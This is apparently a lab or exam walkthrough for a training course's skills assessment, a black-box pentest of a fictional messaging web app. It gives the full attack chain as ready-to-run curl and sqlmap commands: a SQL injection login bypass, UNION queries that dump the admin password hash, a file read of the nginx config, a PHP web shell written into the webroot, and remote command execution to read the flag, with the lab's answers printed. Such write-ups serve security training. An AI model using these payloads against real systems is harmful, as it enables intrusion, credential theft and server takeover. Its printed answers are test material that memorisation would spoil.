# Section 17 — Skills Assessment

**Scenario:** Black-box pentest of chattr GmbH's HTTPS messaging web app. No source code provided.

---

## Reconnaissance

The app runs over HTTPS (nginx). Use `-k` or `--no-check-certificate` with curl to skip the SSL (Secure Sockets Layer) certificate check on self-signed lab certificates.

```bash
curl -sk "https://TARGET_IP:PORT/" | grep -oP '(href|action)="[^"]*"'
```
> Fetches the app's homepage over HTTPS and extracts all href and form action URLs. `-s` silences progress output, `-k` skips certificate verification. Replace `TARGET_IP` and `PORT` with your target's values.

**Pages found:** `/login.php`, `/register.php`, `/api/login.php`, `/api/register.php`

---

## Step 1 — Bypass Registration (invitationCode SQLi)

The registration form requires an invitation code. Single quote → 500 error = injectable.

```bash
# Bypass invitation code check
curl -sk "https://TARGET_IP:PORT/api/register.php" \
  -d "username=pwner&password=Password1&repeatPassword=Password1&invitationCode=' OR '1'='1"

# Log in and capture session cookie
curl -sk "https://TARGET_IP:PORT/api/login.php" \
  -d "username=pwner&password=Password1" \
  -D - -c /tmp/cookies.txt
```
> Two-step account creation and login. The `invitationCode=' OR '1'='1` payload bypasses the invitation check via SQLi. The second curl logs in and saves the session cookie to `/tmp/cookies.txt`. `-D -` prints response headers so you can see the `Set-Cookie` header. Replace the username, password, `TARGET_IP`, and `PORT` with your values.

---

## Step 2 — Find Direct-Output Injection (q= parameter)

After login, the app shows a messaging interface at `/?u=<id>&q=<search>`. The `q=` search parameter is injectable. UNION results appear as chat messages in the response.

**Column count:** 4 (confirmed via ORDER BY or `UNION SELECT NULL,NULL,NULL,NULL`)

**Visible column:** 4 (rightmost — it appears as the message content in the chat view)

```bash
# Confirm injection — single quote breaks query
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" --data-urlencode "q='"

# Confirm UNION works — 'MARKER' appears as a chat message
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,'MARKER'-- -"
```
> Two-step injection confirmation. The first confirms the parameter is injectable (a `'` causes a 500 error). The second confirms UNION works — if `MARKER` appears in the response as a message, column 4 is visible and UNION injection is live. Replace `PHPSESSID=...` with your actual session cookie value.

---

## Q1 — Admin Password Hash

```bash
# Enumerate databases
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata-- -"
# → chattr

# Enumerate tables in chattr
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.TABLES WHERE table_schema='chattr'-- -"
# → Users, Messages, invitationcodes

# Enumerate columns in Users
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE table_name='Users'-- -"
# → UserID, Username, Password, InvitationCode, AccountCreated

# Dump admin hash
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,Password FROM chattr.Users WHERE Username='admin'-- -"
```
> Four-step enumeration chain via UNION injection. Each step builds on the previous. Note the injection syntax: `') UNION...-- -` — the `'` closes the string and `)` closes the LIKE wildcard before the UNION. `-G --data-urlencode` sends the payload as a properly encoded GET parameter. Replace `PHPSESSID=...` with your actual session cookie.

**Q1 Answer:** `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

> Hash algorithm: Argon2i — this is a modern, memory-hard hash. It is not crackable by standard hashcat wordlist attacks in any reasonable time.

---

## Q2 — Webroot Path

```bash
# Read nginx config to get document root
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -"
```
> Reads the nginx configuration file via `LOAD_FILE()`. The `root` directive inside reveals the webroot path needed for writing a shell. Replace the cookie and target values with your own.

**Nginx config (relevant excerpt):**
```
server {
    listen 443 ssl;
    server_name chattr.htb;
    root /var/www/chattr-prod;
    ...
}
```

**Q2 Answer:** `/var/www/chattr-prod`

---

## Q3 — Remote Code Execution via Web Shell

```bash
# Write PHP web shell to webroot
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,'<?php system(\$_REQUEST[0]); ?>' INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -"

# Confirm RCE
curl -sk "https://TARGET_IP:PORT/shell.php?0=id"
# → uid=33(www-data) gid=33(www-data)

# Find and read flag
curl -sk "https://TARGET_IP:PORT/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
# → /flag_876a4c.txt

curl -sk "https://TARGET_IP:PORT/shell.php?0=cat+/flag_876a4c.txt"
```
> Three-step RCE chain. First writes a PHP web shell to the discovered webroot using `INTO OUTFILE`. Then confirms execution with `id`. Finally finds and reads the flag file. Replace the session cookie, `TARGET_IP`, `PORT`, and the webroot path with your target's values.

**Q3 Answer:** `061b1aeb94dec6bf5d9c27032b3c1d8d`

---

## sqlmap Shortcut (once injection confirmed)

```bash
# Dump Users table
sqlmap -u "https://TARGET_IP:PORT/index.php?u=1&q=hello" \
  --cookie="PHPSESSID=..." \
  --dbms=mysql --batch --no-cast -p q --technique=U \
  -D chattr -T Users -C Username,Password --dump

# Read file
sqlmap ... --sql-query="SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')"

# Write shell
sqlmap ... --file-write=/tmp/shell.php --file-dest=/var/www/chattr-prod/shell.php
```
> SQLmap shortcut once injection is confirmed. `-p q` targets the `q` parameter, `--technique=U` forces UNION-only mode, `--batch` skips all prompts. `--file-write` uploads a local shell to `--file-dest` on the server. Replace the URL, cookie, database name, table, and paths with your target's values.

---

## Full Attack Chain Summary

```
1. Register: invitationCode=' OR '1'='1  → bypasses invitation check
2. Login: get PHPSESSID cookie
3. q= search parameter: UNION injection (4 cols, col 4 visible)
4. Enumerate: information_schema → chattr → Users → Username,Password
5. Dump: admin Argon2i hash
6. Read file: LOAD_FILE('/etc/nginx/sites-enabled/default') → webroot = /var/www/chattr-prod
7. Write shell: INTO OUTFILE '/var/www/chattr-prod/shell.php'
8. RCE: /shell.php?0=cat+/flag_XXXXXX.txt
```

---

## Exam Notes

- Always look for direct-output injection after authenticating — blind SQLi is 10-100x slower
- The `q=` search parameter used a LIKE query with `'%INPUT%'` — inject with `') UNION...-- -` to escape the closing `'%`
- `LOAD_FILE` on `/etc/nginx/sites-enabled/default` reliably reveals webroot without needing `@@datadir`
- Argon2i hashes are PHP's modern password_hash() format — practically uncrackable; focus on obtaining the hash as proof, not cracking it
- MySQL `INTO OUTFILE` in a UNION writes the entire result set to the file — use `NULL` padding and put shell content in the last column for a clean file
